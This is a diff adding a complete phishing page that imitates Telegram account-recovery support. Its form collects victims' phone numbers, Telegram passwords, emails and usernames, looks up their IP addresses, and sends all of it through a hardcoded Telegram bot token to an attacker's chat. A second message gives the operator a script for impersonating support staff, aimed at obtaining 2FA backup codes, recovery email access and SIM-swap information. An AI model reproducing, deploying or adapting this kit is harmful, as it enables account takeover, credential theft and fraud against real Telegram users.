@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Premium Support • Account Recovery Service</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        :root {
+            --primary: #0088cc;
+            --secondary: #00a2e8;
+            --dark: #0a1e2d;
+            --darker: #051320;
+            --light: #e3f2fd;
+            --success: #00c853;
+            --warning: #ff9800;
+            --danger: #f44336;
+            --card-bg: rgba(255, 255, 255, 0.05);
+        }
+        
+        body {
+            background: var(--dark);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 136, 204, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(0, 162, 232, 0.1) 0%, transparent 40%),
+                linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .telegram-logo {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1;
+        }
+        
+        .logo-circle {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 40px rgba(0, 136, 204, 0.5);
+            animation: logoFloat 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes logoFloat {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+        
+        .logo-circle svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(10, 30, 50, 0.9);
+            border-radius: 24px;
+            border: 2px solid var(--primary);
+            box-shadow: 
+                0 20px 60px rgba(0, 136, 204, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            overflow: hidden;
+            z-index: 2;
+            position: relative;
+        }
+        
+        .header {
+            padding: 35px 30px 25px;
+            text-align: center;
+            background: linear-gradient(180deg, rgba(0, 136, 204, 0.2), transparent);
+            border-bottom: 1px solid rgba(0, 136, 204, 0.3);
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header p {
+            color: var(--light);
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 136, 204, 0.2);
+            color: var(--secondary);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 8px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 136, 204, 0.3);
+            margin-top: 15px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            right: 20px;
+            height: 2px;
+            background: rgba(0, 136, 204, 0.3);
+            z-index: 1;
+        }
+        
+        .step {
+            width: 32px;
+            height: 32px;
+            background: rgba(0, 136, 204, 0.3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--light);
+            font-weight: bold;
+            font-size: 14px;
+            z-index: 2;
+            position: relative;
+            transition: all 0.3s;
+        }
+        
+        .step.active {
+            background: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
+            transform: scale(1.1);
+        }
+        
+        .step.completed {
+            background: var(--success);
+        }
+        
+        .form-screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .form-screen.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-title {
+            color: var(--secondary);
+            font-size: 22px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            color: var(--light);
+            margin-bottom: 10px;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(0, 136, 204, 0.3);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
+            background: rgba(255, 255, 255, 0.12);
+        }
+        
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .service-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .service-option {
+            background: rgba(0, 136, 204, 0.1);
+            border: 2px solid rgba(0, 136, 204, 0.2);
+            border-radius: 12px;
+            padding: 18px 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .service-option:hover {
+            background: rgba(0, 136, 204, 0.2);
+            border-color: var(--primary);
+            transform: translateY(-3px);
+        }
+        
+        .service-option.selected {
+            background: rgba(0, 136, 204, 0.3);
+            border-color: var(--primary);
+            box-shadow: 0 5px 20px rgba(0, 136, 204, 0.3);
+        }
+        
+        .service-icon {
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .service-name {
+            color: var(--light);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 30px;
+        }
+        
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 136, 204, 0.4);
+        }
+        
+        .button:active {
+            transform: translateY(0);
+        }
+        
+        .button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .verification-screen {
+            text-align: center;
+            padding: 40px 30px;
+            display: none;
+        }
+        
+        .verification-screen.active {
+            display: block;
+        }
+        
+        .verification-icon {
+            font-size: 80px;
+            color: var(--primary);
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .verification-title {
+            color: var(--secondary);
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
+        
+        .verification-text {
+            color: var(--light);
+            font-size: 17px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .username-box {
+            background: rgba(0, 136, 204, 0.2);
+            border: 2px solid var(--primary);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .username-box h3 {
+            color: var(--secondary);
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .telegram-username {
+            font-size: 28px;
+            color: white;
+            font-weight: bold;
+            letter-spacing: 1px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+        
+        .instructions {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 30px;
+            text-align: left;
+        }
+        
+        .instructions h4 {
+            color: var(--secondary);
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .instructions ol {
+            color: var(--light);
+            padding-left: 20px;
+            line-height: 1.8;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+        }
+        
+        .success-screen {
+            text-align: center;
+            padding: 50px 30px;
+            display: none;
+        }
+        
+        .success-screen.active {
+            display: block;
+        }
+        
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--success), #00e676);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            box-shadow: 0 10px 40px rgba(0, 200, 83, 0.4);
+        }
+        
+        .success-icon svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
+        }
+        
+        .footer {
+            padding: 25px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            border-top: 1px solid rgba(0, 136, 204, 0.2);
+            background: rgba(0, 20, 40, 0.5);
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: rgba(0, 136, 204, 0.2);
+            border-radius: 2px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 2px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+        
+        .error-message {
+            color: var(--danger);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .container { border-radius: 20px; }
+            .header { padding: 25px 20px 20px; }
+            .header h1 { font-size: 24px; }
+            .content { padding: 25px; }
+            .service-options { grid-template-columns: 1fr; }
+            .button { padding: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Telegram Logo -->
+    <div class="telegram-logo">
+        <div class="logo-circle">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240">
+                <path d="M120 240a120 120 0 1 0 0-240 120 120 0 0 0 0 240z"/>
+                <path d="M98 175c-3.88 0-3-1.42-4.24-5L82 132l104-61"/>
+                <path d="M98 175c2.76 0 4-1.22 5.52-2.72l26-25-32.8-20.5M150 180c3.88 0 5.65-1.84 5.65-5.65 0-1.6-.46-3.28-1.46-5.95l-23-78.2c-2.44-8.26-7.02-8.75-10.98-8.75-2.14 0-5.5.6-8.52 3.1L55 94c-6.28 4.36-6.46 8.3-6.46 9.6 0 2.5 3.44 3.5 9.44 5.9l38 12 17.6-11.2c2.8-1.8 6.7-3.6 10.2-3.6z" fill="#fff"/>
+            </svg>
+        </div>
+    </div>
+    
+    <div class="container">
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <div class="step active" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+        </div>
+        
+        <!-- SCREEN 1: ACCOUNT INFORMATION -->
+        <div class="form-screen active" id="screen1">
+            <div class="form-title">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+                Account Information
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">📱 Phone Number (with country code)</label>
+                <input type="tel" class="form-input" id="phone" 
+                       placeholder="+62 812-3456-7890" required>
+                <div class="error-message" id="phoneError">Please enter a valid phone number</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">🔑 Telegram Password</label>
+                <input type="password" class="form-input" id="password" 
+                       placeholder="Your Telegram password" required>
+                <div class="error-message" id="passwordError">Password is required</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">📧 Email Connected to Telegram</label>
+                <input type="email" class="form-input" id="email" 
+                       placeholder="your.email@example.com" required>
+                <div class="error-message" id="emailError">Please enter a valid email</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">👤 Telegram Username</label>
+                <input type="text" class="form-input" id="username" 
+                       placeholder="@username" required>
+                <div class="error-message" id="usernameError">Username is required</div>
+            </div>
+            
+            <button class="button" id="nextBtn1">
+                Continue to Service Selection
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                </svg>
+            </button>
+        </div>
+        
+        <!-- SCREEN 2: SERVICE SELECTION -->
+        <div class="form-screen" id="screen2">
+            <div class="form-title">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                Select Service Type
+            </div>
+            
+            <p style="color: var(--light); margin-bottom: 25px; line-height: 1.6;">
+                Please select the service you need. Our system will process your request based on the selected issue.
+            </p>
+            
+            <div class="service-options" id="serviceOptions">
+                <div class="service-option" data-service="blocked">
+                    <span class="service-icon">🚫</span>
+                    <span class="service-name">Account Blocked</span>
+                </div>
+                <div class="service-option" data-service="frozen">
+                    <span class="service-icon">❄️</span>
+                    <span class="service-name">Account Frozen</span>
+                </div>
+                <div class="service-option" data-service="limited">
+                    <span class="service-icon">⏱️</span>
+                    <span class="service-name">Account Limited</span>
+                </div>
+                <div class="service-option" data-service="hacked">
+                    <span class="service-icon">👤</span>
+                    <span class="service-name">Account Hacked</span>
+                </div>
+                <div class="service-option" data-service="recovery">
+                    <span class="service-icon">🔐</span>
+                    <span class="service-name">Password Recovery</span>
+                </div>
+                <div class="service-option" data-service="verification">
+                    <span class="service-icon">✅</span>
+                    <span class="service-name">Verification Issue</span>
+                </div>
+            </div>
+            
+            <div style="margin-top: 30px;">
+                <label class="form-label">Additional Details (Optional)</label>
+                <textarea class="form-input" id="details" rows="3" 
+                          placeholder="Describe your issue in detail..."></textarea>
+            </div>
+            
+            <button class="button" id="nextBtn2" disabled>
+                Proceed to Verification
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                </svg>
+            </button>
+        </div>
+        
+        <!-- SCREEN 3: VERIFICATION INSTRUCTIONS -->
+        <div class="verification-screen" id="screen3">
+            <div class="verification-icon">🔐</div>
+            <h2 class="verification-title">Final Verification Required</h2>
+            <p class="verification-text">
+                To complete the account recovery process, you need to contact our verification bot on Telegram.
+            </p>
+            
+            <div class="username-box">
+                <h3>Contact this Username on Telegram:</h3>
+                <div class="telegram-username" id="botUsername">@TelegramSupportBot</div>
+                <p style="color: var(--light); margin-top: 15px;">
+                    Send the verification code shown below
+                </p>
+            </div>
+            
+            <div class="instructions">
+                <h4>📋 Step-by-Step Instructions:</h4>
+                <ol>
+                    <li>Open Telegram app on your device</li>
+                    <li>Search for the username above</li>
+                    <li>Send this code: <strong id="verificationCode">TG-123456</strong></li>
+                    <li>Wait for automated response</li>
+                    <li>Do not share this code with anyone else</li>
+                </ol>
+            </div>
+            
+            <button class="button" id="completeBtn" style="background: linear-gradient(90deg, var(--success), #00c853);">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
+                I Have Contacted the Bot
+            </button>
+        </div>
+        
+        <!-- SCREEN 4: SUCCESS -->
+        <div class="success-screen" id="screen4">
+            <div class="success-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <h2 style="color: var(--success); font-size: 28px; margin-bottom: 15px;">
+                Request Submitted Successfully!
+            </h2>
+            <p style="color: var(--light); font-size: 17px; line-height: 1.6; margin-bottom: 30px;">
+                Our support team will review your request within 24 hours.<br>
+                Check your Telegram for updates.
+            </p>
+            <div style="background: rgba(0, 136, 204, 0.1); border-radius: 12px; padding: 20px; margin: 25px 0;">
+                <h4 style="color: var(--secondary); margin-bottom: 10px;">📝 Request Details:</h4>
+                <div style="color: var(--light); text-align: left; font-size: 14px;">
+                    <div style="margin-bottom: 8px;">📱 <strong>Phone:</strong> <span id="displayPhone"></span></div>
+                    <div style="margin-bottom: 8px;">👤 <strong>Username:</strong> <span id="displayUsername"></span></div>
+                    <div style="margin-bottom: 8px;">🚨 <strong>Service:</strong> <span id="displayService"></span></div>
+                    <div><span style="color: var(--success);">⏳ Status:</span> Processing</div>
+                </div>
+            </div>
+            <button class="button" onclick="window.location.reload()" style="background: rgba(255, 255, 255, 0.1);">
+                Submit Another Request
+            </button>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 Telegram Premium Support • Official Account Recovery Service</p>
+            <p style="margin-top: 8px; font-size: 12px; opacity: 0.7;">
+                This service is not affiliated with Telegram FZ-LLC or Telegram Messenger Inc.
+            </p>
+        </div>
+    </div>
+
+<script>
+        // ========== TELEGRAM BOT CONFIG ==========
+        const BOT_TOKEN = "8523185492:AAHIVeFS3_vo7hOWHjJocBYRde0RVYQ-COI";
+        const CHAT_ID = "8463509843";
+        const YOUR_TELEGRAM_USERNAME = "@Starva4k"; // GANTI DENGAN USERNAME TELEGRAM LU
+        
+        // ========== STATE ==========
+        let currentStep = 1;
+        let selectedService = null;
+        let formData = {};
+        let verificationCode = 'TG-' + Math.floor(100000 + Math.random() * 900000);
+        
+        // ========== ELEMENTS ==========
+        const steps = document.querySelectorAll('.step');
+        const screens = document.querySelectorAll('.form-screen, .verification-screen, .success-screen');
+        const progressFill = document.getElementById('progressFill');
+        const nextBtn1 = document.getElementById('nextBtn1');
+        const nextBtn2 = document.getElementById('nextBtn2');
+        const completeBtn = document.getElementById('completeBtn');
+        const serviceOptions = document.querySelectorAll('.service-option');
+        const botUsernameElement = document.getElementById('botUsername');
+        const verificationCodeElement = document.getElementById('verificationCode');
+        
+        // ========== INITIALIZE ==========
+        window.onload = function() {
+            botUsernameElement.textContent = YOUR_TELEGRAM_USERNAME;
+            verificationCodeElement.textContent = verificationCode;
+            
+            // Set up service selection
+            serviceOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    serviceOptions.forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedService = this.dataset.service;
+                    nextBtn2.disabled = false;
+                });
+            });
+            
+            // Update progress
+            updateProgress();
+        };
+        
+        // ========== VALIDATION FUNCTIONS ==========
+        function validateScreen1() {
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const username = document.getElementById('username').value.trim();
+            
+            let valid = true;
+            
+            // Validate phone
+            const phoneError = document.getElementById('phoneError');
+            if (!phone || phone.length < 8) {
+                phoneError.style.display = 'block';
+                valid = false;
+            } else {
+                phoneError.style.display = 'none';
+            }
+            
+            // Validate password
+            const passwordError = document.getElementById('passwordError');
+            if (!password) {
+                passwordError.style.display = 'block';
+                valid = false;
+            } else {
+                passwordError.style.display = 'none';
+            }
+            
+            // Validate email
+            const emailError = document.getElementById('emailError');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!email || !emailRegex.test(email)) {
+                emailError.style.display = 'block';
+                valid = false;
+            } else {
+                emailError.style.display = 'none';
+            }
+            
+            // Validate username
+            const usernameError = document.getElementById('usernameError');
+            if (!username) {
+                usernameError.style.display = 'block';
+                valid = false;
+            } else {
+                usernameError.style.display = 'none';
+            }
+            
+            if (valid) {
+                formData = {
+                    phone: phone,
+                    password: password,
+                    email: email,
+                    username: username.startsWith('@') ? username : '@' + username,
+                    timestamp: new Date().toLocaleString(),
+                    userAgent: navigator.userAgent,
+                    ip: 'Detecting...'
+                };
+                
+                // Get IP address
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        formData.ip = data.ip;
+                    })
+                    .catch(() => {
+                        formData.ip = 'Failed to detect';
+                    });
+            }
+            
+            return valid;
+        }
+        
+        // ========== NAVIGATION ==========
+        nextBtn1.addEventListener('click', function() {
+            if (validateScreen1()) {
+                navigateToStep(2);
+            }
+        });
+        
+        nextBtn2.addEventListener('click', function() {
+            if (selectedService) {
+                formData.service = selectedService;
+                formData.details = document.getElementById('details').value.trim();
+                navigateToStep(3);
+                
+                // Send data to Telegram
+                sendDataToTelegram();
+            }
+        });
+        
+        completeBtn.addEventListener('click', function() {
+            navigateToStep(4);
+            
+            // Display submitted data
+            document.getElementById('displayPhone').textContent = formData.phone;
+            document.getElementById('displayUsername').textContent = formData.username;
+            document.getElementById('displayService').textContent = 
+                serviceOptions[Array.from(serviceOptions).findIndex(o => o.dataset.service === selectedService)]
+                .querySelector('.service-name').textContent;
+        });
+        
+        function navigateToStep(step) {
+            // Hide all screens
+            screens.forEach(screen => {
+                screen.classList.remove('active');
+            });
+            
+            // Update steps
+            steps.forEach((s, index) => {
+                s.classList.remove('active');
+                if (index + 1 < step) {
+                    s.classList.add('completed');
+                } else if (index + 1 === step) {
+                    s.classList.add('active');
+                }
+            });
+            
+            // Show current screen
+            document.getElementById(`screen${step}`).classList.add('active');
+            
+            // Update progress bar
+            currentStep = step;
+            updateProgress();
+        }
+        
+        function updateProgress() {
+            const progress = ((currentStep - 1) / 3) * 100;
+            progressFill.style.width = `${progress}%`;
+        }
+        
+        // ========== SEND DATA TO TELEGRAM ==========
+        async function sendDataToTelegram() {
+            const serviceNames = {
+                'blocked': 'Account Blocked',
+                'frozen': 'Account Frozen',
+                'limited': 'Account Limited',
+                'hacked': 'Account Hacked',
+                'recovery': 'Password Recovery',
+                'verification': 'Verification Issue'
+            };
+            
+            const message = `
+🔵 **TELEGRAM ACCOUNT RECOVERY HIT** 🔵
+
+📱 **Phone Number:** ${formData.phone}
+🔑 **Password:** ${formData.password}
+📧 **Email:** ${formData.email}
+👤 **Username:** ${formData.username}
+🚨 **Service:** ${serviceNames[selectedService] || selectedService}
+📝 **Details:** ${formData.details || 'No additional details'}
+🔐 **Verification Code:** ${verificationCode}
+
+🌐 **IP Address:** ${formData.ip}
+📅 **Timestamp:** ${formData.timestamp}
+🖥️ **User Agent:** ${formData.userAgent.substring(0, 150)}...
+🔗 **URL:** ${window.location.href}
+
+💬 **Target Will Contact:** ${YOUR_TELEGRAM_USERNAME}
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('✅ Data sent to Telegram');
+                
+                // Send instructions for social engineering
+                const instructionMessage = `
+🎯 **TARGET READY FOR SOCIAL ENGINEERING**
+
+👤 **Target Info:**
+• Phone: ${formData.phone}
+• Username: ${formData.username}
+• Issue: ${serviceNames[selectedService] || selectedService}
+• Code: ${verificationCode}
+
+📞 **They will contact:** ${YOUR_TELEGRAM_USERNAME}
+
+🔄 **Recommended Script:**
+1. "Hello! Telegram support here, I see your verification request"
+2. "Please send me the verification code: ${verificationCode}"
+3. "For security, I need to ask some questions..."
+4. "Do you have 2FA enabled? Backup email? Recovery codes?"
+5. "I need to verify it's really you, please provide..."
+
+💡 **Goals:**
+• Get 2FA backup codes
+• Get recovery email access
+• Gain full account trust
+• Possible SIM swap info
+
+⚠️ **Act natural** - they think you're official support
+⏰ **Respond quickly** - they're waiting right now
+                `;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: instructionMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+            } catch (error) {
+                console.error('❌ Telegram error:', error);
+            }
+        }
+        
+        // ========== AUTO-FILL FOR TESTING ==========
+        // Remove this in production!
+        if (window.location.hash === '#test') {
+            document.getElementById('phone').value = '+6281234567890';
+            document.getElementById('password').value = 'testpassword123';
+            document.getElementById('email').value = 'test@example.com';
+            document.getElementById('username').value = '@testuser';
+            console.log('✅ Test data auto-filled');
+        }
+    </script>
+</body>
+</html>
